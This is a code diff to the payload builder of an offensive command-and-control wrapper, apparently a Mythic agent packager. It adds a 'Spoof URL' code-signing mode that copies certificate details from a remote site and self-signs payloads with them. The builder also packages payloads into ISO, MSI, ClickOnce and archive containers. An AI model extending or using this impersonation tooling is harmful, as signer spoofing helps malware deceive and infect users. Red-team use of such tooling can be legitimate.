@@ -13,7 +13,7 @@ from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
 from erebus_wrapper.erebus.modules.container_msi import build_msi
 from erebus_wrapper.erebus.modules.container_archive import build_7z, build_zip
 from erebus_wrapper.erebus.modules.container_iso import build_iso
-from erebus_wrapper.erebus.modules.codesigner import self_sign_payload
+from erebus_wrapper.erebus.modules.codesigner import self_sign_payload, get_remote_cert_details
 
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
@@ -335,7 +335,7 @@ generated if none have been entered.""",
             name="Codesign Type",
             parameter_type=BuildParameterType.ChooseOne,
             description="Backdoor an existing ISO",
-            choices=["SelfSign", "Provide Certificate"],
+            choices=["SelfSign", "Spoof URL", "Provide Certificate"],
             required=False,
             hide_conditions=[
                 HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value=False)
@@ -363,6 +363,18 @@ generated if none have been entered.""",
                 HideCondition(name="Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
             ]
         ),
+
+        BuildParameter(
+            name="Codesign Spoof URL",
+            parameter_type=BuildParameterType.String,
+            default_value="www.test.test",
+            description="URL to clone certificate details from",
+            hide_conditions=[
+                HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
+                HideCondition(name="Codesign Type", operand=HideConditionOperand.NotEQ, value="Spoof URL")
+            ]
+        ),
+
     ]
 
     build_steps = [
@@ -876,19 +888,34 @@ generated if none have been entered.""",
                         raise FileNotFoundError(f"Payload not found for signing at: {payload_path}")
 
                     signing_type = self.get_parameter("Codesign Type")
+                    success_msg = ""
 
-                    cn= self.get_parameter("Codesign CN")
                     if signing_type == "SelfSign":
+                        cn = self.get_parameter("Codesign CN")
+                        org = self.get_parameter("Codesign Orgname") or cn
+
                         self_sign_payload(
                             payload_path=payload_path,
                             subject_cn=cn,
-                            org_name=self.get_parameter("Codesign Orgname"),
-                            build_path=Path(agent_build_path)
+                            org_name=org
                         )
                         success_msg = f"Self-signed with CN: {cn}"
 
-                    elif signing_type == "Provide Certificate":
+                    elif signing_type == "Spoof URL":
+                        target_url = self.get_parameter("Codesign Spoof URL")
+                        if not target_url:
+                            raise ValueError("No URL provided for spoofing")
+                        
+                        cert_details = get_remote_cert_details(target_url)
+                        self_sign_payload(
+                            payload_path=payload_path,
+                            subject_cn=cert_details["CN"],
+                            org_name=cert_details["O"],
+                            full_details=cert_details  # Pass the dict for high-fidelity cloning
+                        )
+                        success_msg = f"Spoofed {target_url} (CN: {cert_details['CN']})"
 
+                    elif signing_type == "Provide Certificate":
                         raise NotImplementedError("Provide Certificate mode not yet implemented in backend")
 
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
@@ -914,7 +941,7 @@ generated if none have been entered.""",
                     StepName="Code Signing",
                     StepStdout="Skipped (Not Enabled)",
                     StepSuccess=True
-                ))
+                ))        
             ######################### Final Payload / Container #########################
 
             # 1. Capture context for container function
